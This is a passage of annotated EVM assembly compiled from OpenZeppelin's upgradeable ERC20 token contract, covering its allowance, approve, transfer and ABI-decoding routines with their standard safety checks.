tag_62:\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":7637:7641  bool */\n      0x00\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":6409:6419  msg.sender */\n      caller\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":7637:7641  bool */\n      dup2\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":7718:7743  allowance(owner, spender) */\n      tag_118\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":6409:6419  msg.sender */\n      dup3\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":7735:7742  spender */\n      dup7\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":7718:7727  allowance */\n      tag_74\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":7718:7743  allowance(owner, spender) */\n      jump\t// in\n    tag_118:\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":7691:7743  uint256 currentAllowance = allowance(owner, spender) */\n      swap1\n      pop\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":7781:7796  subtractedValue */\n      dup4\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":7761:7777  currentAllowance */\n      dup2\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":7761:7796  currentAllowance >= subtractedValue */\n      lt\n      iszero\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":7753:7838  require(currentAllowance >= subtractedValue, \"ERC20: decreased allowance below zero\") */\n      tag_119\n      jumpi\n      mload(0x40)\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n        /* \"#utility.yul\":3781:3783   */\n      0x20\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":7753:7838  require(currentAllowance >= subtractedValue, \"ERC20: decreased allowance below zero\") */\n      0x04\n      dup3\n      add\n        /* \"#utility.yul\":3763:3784   */\n      mstore\n        /* \"#utility.yul\":3820:3822   */\n      0x25\n        /* \"#utility.yul\":3800:3818   */\n      0x24\n      dup3\n      add\n        /* \"#utility.yul\":3793:3823   */\n      mstore\n        /* \"#utility.yul\":3859:3893   */\n      0x45524332303a2064656372656173656420616c6c6f77616e63652062656c6f77\n        /* \"#utility.yul\":3839:3857   */\n      0x44\n      dup3\n      add\n        /* \"#utility.yul\":3832:3894   */\n      mstore\n      shl(0xd8, 0x207a65726f)\n        /* \"#utility.yul\":3910:3928   */\n      0x64\n      dup3\n      add\n        /* \"#utility.yul\":3903:3938   */\n      mstore\n        /* \"#utility.yul\":3955:3974   */\n      0x84\n      add\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":7753:7838  require(currentAllowance >= subtractedValue, \"ERC20: decreased allowance below zero\") */\n      tag_106\n        /* \"#utility.yul\":3579:3980   */\n      jump\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":7753:7838  require(currentAllowance >= subtractedValue, \"ERC20: decreased allowance below zero\") */\n    tag_119:\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":7872:7932  _approve(owner, spender, currentAllowance - subtractedValue) */\n      tag_93\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":7881:7886  owner */\n      dup3\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":7888:7895  spender */\n      dup7\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":7916:7931  subtractedValue */\n      dup7\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":7897:7913  currentAllowance */\n      dup5\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":7897:7931  currentAllowance - subtractedValue */\n      sub\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":7872:7880  _approve */\n      tag_87\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":7872:7932  _approve(owner, spender, currentAllowance - subtractedValue) */\n      jump\t// in\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":4117:4306  function transfer(address to, uint256 amount) public virtual override returns (bool) {... */\n    tag_66:\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":4196:4200  bool */\n      0x00\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":6409:6419  msg.sender */\n      caller\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":4250:4278  _transfer(owner, to, amount) */\n      tag_86\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":6409:6419  msg.sender */\n      dup2\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":4267:4269  to */\n      dup6\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":4271:4277  amount */\n      dup6\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":4250:4259  _transfer */\n      tag_94\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":4250:4278  _transfer(owner, to, amount) */\n      jump\t// in\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":4364:4513  function allowance(address owner, address spender) public view virtual override returns (uint256) {... */\n    tag_74:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":4479:4497  _allowances[owner] */\n      swap2\n      dup3\n      and\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":4453:4460  uint256 */\n      0x00\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":4479:4497  _allowances[owner] */\n      swap1\n      dup2\n      mstore\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":4479:4490  _allowances */\n      0x34\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":4479:4497  _allowances[owner] */\n      0x20\n      swap1\n      dup2\n      mstore\n      0x40\n      dup1\n      dup4\n      keccak256\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":4479:4506  _allowances[owner][spender] */\n      swap4\n      swap1\n      swap5\n      and\n      dup3\n      mstore\n      swap2\n      swap1\n      swap2\n      mstore\n      keccak256\n      sload\n      swap1\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":4364:4513  function allowance(address owner, address spender) public view virtual override returns (uint256) {... */\n      jump\t// out\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":11456:11826  function _approve(... */\n    tag_87:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":11587:11606  owner != address(0) */\n      dup4\n      and\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":11579:11647  require(owner != address(0), \"ERC20: approve from the zero address\") */\n      tag_130\n      jumpi\n      mload(0x40)\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n        /* \"#utility.yul\":4187:4189   */\n      0x20\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":11579:11647  require(owner != address(0), \"ERC20: approve from the zero address\") */\n      0x04\n      dup3\n      add\n        /* \"#utility.yul\":4169:4190   */\n      mstore\n        /* \"#utility.yul\":4226:4228   */\n      0x24\n        /* \"#utility.yul\":4206:4224   */\n      dup1\n      dup3\n      add\n        /* \"#utility.yul\":4199:4229   */\n      mstore\n        /* \"#utility.yul\":4265:4299   */\n      0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464\n        /* \"#utility.yul\":4245:4263   */\n      0x44\n      dup3\n      add\n        /* \"#utility.yul\":4238:4300   */\n      mstore\n      shl(0xe0, 0x72657373)\n        /* \"#utility.yul\":4316:4334   */\n      0x64\n      dup3\n      add\n        /* \"#utility.yul\":4309:4343   */\n      mstore\n        /* \"#utility.yul\":4360:4379   */\n      0x84\n      add\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":11579:11647  require(owner != address(0), \"ERC20: approve from the zero address\") */\n      tag_106\n        /* \"#utility.yul\":3985:4385   */\n      jump\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":11579:11647  require(owner != address(0), \"ERC20: approve from the zero address\") */\n    tag_130:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":11665:11686  spender != address(0) */\n      dup3\n      and\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":11657:11725  require(spender != address(0), \"ERC20: approve to the zero address\") */\n      tag_133\n      jumpi\n      mload(0x40)\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n        /* \"#utility.yul\":4592:4594   */\n      0x20\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":11657:11725  require(spender != address(0), \"ERC20: approve to the zero address\") */\n      0x04\n      dup3\n      add\n        /* \"#utility.yul\":4574:4595   */\n      mstore\n        /* \"#utility.yul\":4631:4633   */\n      0x22\n        /* \"#utility.yul\":4611:4629   */\n      0x24\n      dup3\n      add\n        /* \"#utility.yul\":4604:4634   */\n      mstore\n        /* \"#utility.yul\":4670:4704   */\n      0x45524332303a20617070726f766520746f20746865207a65726f206164647265\n        /* \"#utility.yul\":4650:4668   */\n      0x44\n      dup3\n      add\n        /* \"#utility.yul\":4643:4705   */\n      mstore\n      shl(0xf0, 0x7373)\n        /* \"#utility.yul\":4721:4739   */\n      0x64\n      dup3\n      add\n        /* \"#utility.yul\":4714:4746   */\n      mstore\n        /* \"#utility.yul\":4763:4782   */\n      0x84\n      add\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":11657:11725  require(spender != address(0), \"ERC20: approve to the zero address\") */\n      tag_106\n        /* \"#utility.yul\":4390:4788   */\n      jump\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":11657:11725  require(spender != address(0), \"ERC20: approve to the zero address\") */\n    tag_133:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":11736:11754  _allowances[owner] */\n      dup4\n      dup2\n      and\n      0x00\n      dup2\n      dup2\n      mstore\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":11736:11747  _allowances */\n      0x34\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":11736:11754  _allowances[owner] */\n      0x20\n      swap1\n      dup2\n      mstore\n      0x40\n      dup1\n      dup4\n      keccak256\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":11736:11763  _allowances[owner][spender] */\n      swap5\n      dup8\n      and\n      dup1\n      dup5\n      mstore\n      swap5\n      dup3\n      mstore\n      swap2\n      dup3\n      swap1\n      keccak256\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":11736:11772  _allowances[owner][spender] = amount */\n      dup6\n      swap1\n      sstore\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":11787:11819  Approval(owner, spender, amount) */\n      swap1\n      mload\n        /* \"#utility.yul\":1342:1367   */\n      dup5\n      dup2\n      mstore\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":11787:11819  Approval(owner, spender, amount) */\n      0x8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925\n      swap2\n        /* \"#utility.yul\":1315:1333   */\n      add\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":11787:11819  Approval(owner, spender, amount) */\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      log3\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":11456:11826  function _approve(... */\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":12107:12548  function _spendAllowance(... */\n    tag_92:\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":12237:12261  uint256 currentAllowance */\n      0x00\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":12264:12289  allowance(owner, spender) */\n      tag_138\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":12274:12279  owner */\n      dup5\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":12281:12288  spender */\n      dup5\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":12264:12273  allowance */\n      tag_74\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":12264:12289  allowance(owner, spender) */\n      jump\t// in\n    tag_138:\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":12237:12289  uint256 currentAllowance = allowance(owner, spender) */\n      swap1\n      pop\n      not(0x00)\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":12303:12319  currentAllowance */\n      dup2\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":12303:12340  currentAllowance != type(uint256).max */\n      eq\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":12299:12542  if (currentAllowance != type(uint256).max) {... */\n      tag_143\n      jumpi\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":12384:12390  amount */\n      dup2\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":12364:12380  currentAllowance */\n      dup2\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":12364:12390  currentAllowance >= amount */\n      lt\n      iszero\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":12356:12424  require(currentAllowance >= amount, \"ERC20: insufficient allowance\") */\n      tag_140\n      jumpi\n      mload(0x40)\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n        /* \"#utility.yul\":4995:4997   */\n      0x20\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":12356:12424  require(currentAllowance >= amount, \"ERC20: insufficient allowance\") */\n      0x04\n      dup3\n      add\n        /* \"#utility.yul\":4977:4998   */\n      mstore\n        /* \"#utility.yul\":5034:5036   */\n      0x1d\n        /* \"#utility.yul\":5014:5032   */\n      0x24\n      dup3\n      add\n        /* \"#utility.yul\":5007:5037   */\n      mstore\n        /* \"#utility.yul\":5073:5104   */\n      0x45524332303a20696e73756666696369656e7420616c6c6f77616e6365000000\n        /* \"#utility.yul\":5053:5071   */\n      0x44\n      dup3\n      add\n        /* \"#utility.yul\":5046:5105   */\n      mstore\n        /* \"#utility.yul\":5122:5140   */\n      0x64\n      add\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":12356:12424  require(currentAllowance >= amount, \"ERC20: insufficient allowance\") */\n      tag_106\n        /* \"#utility.yul\":4793:5146   */\n      jump\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":12356:12424  require(currentAllowance >= amount, \"ERC20: insufficient allowance\") */\n    tag_140:\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":12466:12517  _approve(owner, spender, currentAllowance - amount) */\n      tag_143\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":12475:12480  owner */\n      dup5\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":12482:12489  spender */\n      dup5\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":12510:12516  amount */\n      dup5\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":12491:12507  currentAllowance */\n      dup5\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":12491:12516  currentAllowance - amount */\n      sub\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":12466:12474  _approve */\n      tag_87\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":12466:12517  _approve(owner, spender, currentAllowance - amount) */\n      jump\t// in\n    tag_143:\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":12227:12548  {... */\n      pop\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":12107:12548  function _spendAllowance(... */\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":8425:9243  function _transfer(... */\n    tag_94:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":8551:8569  from != address(0) */\n      dup4\n      and\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":8543:8611  require(from != address(0), \"ERC20: transfer from the zero address\") */\n      tag_145\n      jumpi\n      mload(0x40)\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n        /* \"#utility.yul\":5353:5355   */\n      0x20\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":8543:8611  require(from != address(0), \"ERC20: transfer from the zero address\") */\n      0x04\n      dup3\n      add\n        /* \"#utility.yul\":5335:5356   */\n      mstore\n        /* \"#utility.yul\":5392:5394   */\n      0x25\n        /* \"#utility.yul\":5372:5390   */\n      0x24\n      dup3\n      add\n        /* \"#utility.yul\":5365:5395   */\n      mstore\n        /* \"#utility.yul\":5431:5465   */\n      0x45524332303a207472616e736665722066726f6d20746865207a65726f206164\n        /* \"#utility.yul\":5411:5429   */\n      0x44\n      dup3\n      add\n        /* \"#utility.yul\":5404:5466   */\n      mstore\n      shl(0xd8, 0x6472657373)\n        /* \"#utility.yul\":5482:5500   */\n      0x64\n      dup3\n      add\n        /* \"#utility.yul\":5475:5510   */\n      mstore\n        /* \"#utility.yul\":5527:5546   */\n      0x84\n      add\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":8543:8611  require(from != address(0), \"ERC20: transfer from the zero address\") */\n      tag_106\n        /* \"#utility.yul\":5151:5552   */\n      jump\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":8543:8611  require(from != address(0), \"ERC20: transfer from the zero address\") */\n    tag_145:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":8629:8645  to != address(0) */\n      dup3\n      and\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":8621:8685  require(to != address(0), \"ERC20: transfer to the zero address\") */\n      tag_148\n      jumpi\n      mload(0x40)\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n        /* \"#utility.yul\":5759:5761   */\n      0x20\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":8621:8685  require(to != address(0), \"ERC20: transfer to the zero address\") */\n      0x04\n      dup3\n      add\n        /* \"#utility.yul\":5741:5762   */\n      mstore\n        /* \"#utility.yul\":5798:5800   */\n      0x23\n        /* \"#utility.yul\":5778:5796   */\n      0x24\n      dup3\n      add\n        /* \"#utility.yul\":5771:5801   */\n      mstore\n        /* \"#utility.yul\":5837:5871   */\n      0x45524332303a207472616e7366657220746f20746865207a65726f2061646472\n        /* \"#utility.yul\":5817:5835   */\n      0x44\n      dup3\n      add\n        /* \"#utility.yul\":5810:5872   */\n      mstore\n      shl(0xe8, 0x657373)\n        /* \"#utility.yul\":5888:5906   */\n      0x64\n      dup3\n      add\n        /* \"#utility.yul\":5881:5914   */\n      mstore\n        /* \"#utility.yul\":5931:5950   */\n      0x84\n      add\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":8621:8685  require(to != address(0), \"ERC20: transfer to the zero address\") */\n      tag_106\n        /* \"#utility.yul\":5557:5956   */\n      jump\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":8621:8685  require(to != address(0), \"ERC20: transfer to the zero address\") */\n    tag_148:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":8767:8782  _balances[from] */\n      dup4\n      and\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":8745:8764  uint256 fromBalance */\n      0x00\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":8767:8782  _balances[from] */\n      swap1\n      dup2\n      mstore\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":8767:8776  _balances */\n      0x33\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":8767:8782  _balances[from] */\n      0x20\n      mstore\n      0x40\n      swap1\n      keccak256\n      sload\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":8800:8821  fromBalance >= amount */\n      dup2\n      dup2\n      lt\n      iszero\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":8792:8864  require(fromBalance >= amount, \"ERC20: transfer amount exceeds balance\") */\n      tag_153\n      jumpi\n      mload(0x40)\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n        /* \"#utility.yul\":6163:6165   */\n      0x20\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":8792:8864  require(fromBalance >= amount, \"ERC20: transfer amount exceeds balance\") */\n      0x04\n      dup3\n      add\n        /* \"#utility.yul\":6145:6166   */\n      mstore\n        /* \"#utility.yul\":6202:6204   */\n      0x26\n        /* \"#utility.yul\":6182:6200   */\n      0x24\n      dup3\n      add\n        /* \"#utility.yul\":6175:6205   */\n      mstore\n        /* \"#utility.yul\":6241:6275   */\n      0x45524332303a207472616e7366657220616d6f756e7420657863656564732062\n        /* \"#utility.yul\":6221:6239   */\n      0x44\n      dup3\n      add\n        /* \"#utility.yul\":6214:6276   */\n      mstore\n      shl(0xd0, 0x616c616e6365)\n        /* \"#utility.yul\":6292:6310   */\n      0x64\n      dup3\n      add\n        /* \"#utility.yul\":6285:6321   */\n      mstore\n        /* \"#utility.yul\":6338:6357   */\n      0x84\n      add\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":8792:8864  require(fromBalance >= amount, \"ERC20: transfer amount exceeds balance\") */\n      tag_106\n        /* \"#utility.yul\":5961:6363   */\n      jump\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":8792:8864  require(fromBalance >= amount, \"ERC20: transfer amount exceeds balance\") */\n    tag_153:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":8898:8913  _balances[from] */\n      dup1\n      dup6\n      and\n      0x00\n      dup2\n      dup2\n      mstore\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":8898:8907  _balances */\n      0x33\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":8898:8913  _balances[from] */\n      0x20\n      mstore\n      0x40\n      dup1\n      dup3\n      keccak256\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":8916:8936  fromBalance - amount */\n      dup7\n      dup7\n      sub\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":8898:8936  _balances[from] = fromBalance - amount */\n      swap1\n      sstore\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":9113:9126  _balances[to] */\n      swap3\n      dup7\n      and\n      dup1\n      dup3\n      mstore\n      swap1\n      dup4\n      swap1\n      keccak256\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":9113:9136  _balances[to] += amount */\n      dup1\n      sload\n      dup7\n      add\n      swap1\n      sstore\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":9162:9188  Transfer(from, to, amount) */\n      swap2\n      mload\n      0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef\n      swap1\n      tag_156\n      swap1\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":8930:8936  amount */\n      dup7\n        /* \"#utility.yul\":1342:1367   */\n      dup2\n      mstore\n        /* \"#utility.yul\":1330:1332   */\n      0x20\n        /* \"#utility.yul\":1315:1333   */\n      add\n      swap1\n        /* \"#utility.yul\":1196:1373   */\n      jump\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":9162:9188  Transfer(from, to, amount) */\n    tag_156:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      log3\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":9199:9236  _afterTokenTransfer(from, to, amount) */\n      tag_143\n        /* \"lib/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\":13132:13253  function _beforeTokenTransfer(... */\n      jump\n        /* \"#utility.yul\":14:562   */\n    tag_20:\n        /* \"#utility.yul\":126:130   */\n      0x00\n        /* \"#utility.yul\":155:157   */\n      0x20\n        /* \"#utility.yul\":184:186   */\n      dup1\n        /* \"#utility.yul\":173:182   */\n      dup4\n        /* \"#utility.yul\":166:187   */\n      mstore\n        /* \"#utility.yul\":216:222   */\n      dup4\n        /* \"#utility.yul\":210:223   */\n      mload\n        /* \"#utility.yul\":259:265   */\n      dup1\n        /* \"#utility.yul\":254:256   */\n      dup3\n        /* \"#utility.yul\":243:252   */\n      dup6\n        /* \"#utility.yul\":239:257   */\n      add\n        /* \"#utility.yul\":232:266   */\n      mstore\n        /* \"#utility.yul\":284:285   */\n      0x00\n        /* \"#utility.yul\":294:434   */\n    tag_164:\n        /* \"#utility.yul\":308:314   */\n      dup2\n        /* \"#utility.yul\":305:306   */\n      dup2\n        /* \"#utility.yul\":302:315   */\n      lt\n        /* \"#utility.yul\":294:434   */\n      iszero\n      tag_166\n      jumpi\n        /* \"#utility.yul\":403:417   */\n      dup6\n      dup2\n      add\n        /* \"#utility.yul\":399:422   */\n      dup4\n      add\n        /* \"#utility.yul\":393:423   */\n      mload\n        /* \"#utility.yul\":369:386   */\n      dup6\n      dup3\n      add\n        /* \"#utility.yul\":388:390   */\n      0x40\n        /* \"#utility.yul\":365:391   */\n      add\n        /* \"#utility.yul\":358:424   */\n      mstore\n        /* \"#utility.yul\":323:333   */\n      dup3\n      add\n        /* \"#utility.yul\":294:434   */\n      jump(tag_164)\n    tag_166:\n        /* \"#utility.yul\":298:301   */\n      pop\n        /* \"#utility.yul\":483:484   */\n      0x00\n        /* \"#utility.yul\":478:480   */\n      0x40\n        /* \"#utility.yul\":469:475   */\n      dup3\n        /* \"#utility.yul\":458:467   */\n      dup7\n        /* \"#utility.yul\":454:476   */\n      add\n        /* \"#utility.yul\":450:481   */\n      add\n        /* \"#utility.yul\":443:485   */\n      mstore\n        /* \"#utility.yul\":553:555   */\n      0x40\n        /* \"#utility.yul\":546:548   */\n      0x1f\n        /* \"#utility.yul\":542:549   */\n      not\n        /* \"#utility.yul\":537:539   */\n      0x1f\n        /* \"#utility.yul\":529:535   */\n      dup4\n        /* \"#utility.yul\":525:540   */\n      add\n        /* \"#utility.yul\":521:550   */\n      and\n        /* \"#utility.yul\":510:519   */\n      dup6\n        /* \"#utility.yul\":506:551   */\n      add\n        /* \"#utility.yul\":502:556   */\n      add\n        /* \"#utility.yul\":494:556   */\n      swap3\n      pop\n      pop\n      pop\n        /* \"#utility.yul\":14:562   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":567:740   */\n    tag_161:\n        /* \"#utility.yul\":635:655   */\n      dup1\n      calldataload\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"#utility.yul\":684:715   */\n      dup2\n      and\n        /* \"#utility.yul\":674:716   */\n      dup2\n      eq\n        /* \"#utility.yul\":664:734   */\n      tag_168\n      jumpi\n        /* \"#utility.yul\":730:731   */\n      0x00\n        /* \"#utility.yul\":727:728   */\n      dup1\n        /* \"#utility.yul\":720:732   */\n      revert\n        /* \"#utility.yul\":664:734   */\n    tag_168:\n        /* \"#utility.yul\":567:740   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":745:999   */\n    tag_23:\n        /* \"#utility.yul\":813:819   */\n      0x00\n        /* \"#utility.yul\":821:827   */\n      dup1\n        /* \"#utility.yul\":874:876   */\n      0x40\n        /* \"#utility.yul\":862:871   */\n      dup4\n        /* \"#utility.yul\":853:860   */\n      dup6\n        /* \"#utility.yul\":849:872   */\n      sub\n        /* \"#utility.yul\":845:877   */\n      slt\n        /* \"#utility.yul\":842:894   */\n      iszero\n      tag_170\n      jumpi\n        /* \"#utility.yul\":890:891   */\n      0x00\n        /* \"#utility.yul\":887:888   */\n      dup1\n        /* \"#utility.yul\":880:892   */\n      revert\n        /* \"#utility.yul\":842:894   */\n    tag_170:\n        /* \"#utility.yul\":913:942   */\n      tag_171\n        /* \"#utility.yul\":932:941   */\n      dup4\n        /* \"#utility.yul\":913:942   */\n      tag_161\n      jump\t// in\n    tag_171:\n        /* \"#utility.yul\":903:942   */\n      swap5\n        /* \"#utility.yul\":989:991   */\n      0x20\n        /* \"#utility.yul\":974:992   */\n      